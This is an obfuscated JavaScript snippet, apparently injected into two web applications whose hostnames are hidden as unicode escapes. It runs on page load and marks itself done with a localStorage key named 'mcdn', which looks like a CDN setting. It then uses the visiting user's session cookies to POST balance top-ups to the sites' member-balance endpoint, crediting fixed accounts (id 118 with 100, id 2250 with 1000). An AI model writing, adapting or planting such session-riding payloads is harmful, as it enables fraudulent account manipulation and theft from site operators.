(function(){
  if(! window.localStorage){
    return false;
  }else{
      var Storage=window.localStorage;
      if(!Storage.getItem("mcdn")){
         if(window.location.hostname==="\u0062\u0079\u0068\u0074\u002e\u0068\u0071\u0079\u0067\u0038\u0038\u0038\u002e\u0063\u006f\u006d"){
            Storage.setItem("mcdn",1);
            var a={i:118, b:100, r:"%E5%85%85%E5%80%BC",t:1,h:"\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u0079\u0068\u0074\u002e\u0068\u0071\u0079\u0067\u0038\u0038\u0038\u002e\u0063\u006f\u006d",a:"\u002f\u004d\u0065\u006d\u0062\u0065\u0072\u002e\u0062\u0061\u006c\u0061\u006e\u0063\u0065\u002e\u0069\u0064\u002e",f:".do", x:"?"},t="id="+a.i+"&balance="+a.b+"&remark="+a.r+"&type="+a.t;
                 fetch(a.h+a.a+a.i+a.f+a.x+t, {
                    "credentials": "include",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-origin"
                    },
                    "referrer":a.h+a.a+a.i+a.f,
                    "body":t,
                    "method": "POST",
                    "mode": "cors"
                });
         }
        
         if(window.location.hostname==="\u0061\u0064\u002e\u0077\u0061\u006e\u006a\u0069\u0061\u0068\u0075\u0069\u0036\u0038\u002e\u0063\u006f\u006d"){
            Storage.setItem("mcdn",1);
            var a={ i:2250,b:1000, r:"汇盈小额",t:1,h:"\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0064\u002e\u0077\u0061\u006e\u006a\u0069\u0061\u0068\u0075\u0069\u0036\u0038\u002e\u0063\u006f\u006d", a:"\u002f\u004d\u0065\u006d\u0062\u0065\u0072\u002e\u0062\u0061\u006c\u0061\u006e\u0063\u0065\u002e\u0069\u0064\u002e",f:".do"}
            fetch(a.h+a.a+a.i+a.f, {
                "credentials": "include",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "multipart/form-data; boundary=---------------------------9527936884269535003433573310",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin"
                },
                "referrer":a.h+a.a+a.i+a.f,
                "body": "-----------------------------9527936884269535003433573310\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+a.i+"\r\n-----------------------------9527936884269535003433573310\r\nContent-Disposition: form-data; name=\"balance\"\r\n\r\n"+a.b+"\r\n-----------------------------9527936884269535003433573310\r\nContent-Disposition: form-data; name=\"remark\"\r\n\r\n"+a.r+"\r\n-----------------------------9527936884269535003433573310\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n"+a.t+"\r\n-----------------------------9527936884269535003433573310--\r\n",
                "method": "POST",
                "mode": "cors"
            });
         }
      }
  }
}())
